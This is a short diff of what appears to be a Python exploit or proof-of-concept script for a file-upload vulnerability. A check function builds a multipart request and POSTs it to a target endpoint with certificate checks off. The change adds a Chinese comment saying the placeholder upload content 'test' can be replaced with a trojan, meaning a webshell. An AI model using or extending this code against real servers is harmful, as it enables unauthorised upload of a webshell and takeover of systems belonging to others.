@@ -58,7 +58,7 @@ def check1(url):
         'Content-Type: application/octet-stream \r\n'
         'Content-Transfer-Encoding: binary \r\n'
         "\r\n"
-        "test\r\n"
+        "test\r\n"  # 这里可以替换成马子
         "--" + rBoundary + "--"
     )
     r = requests.post(url + point1,data = data,headers=headers,verify=False,proxies=proxies)
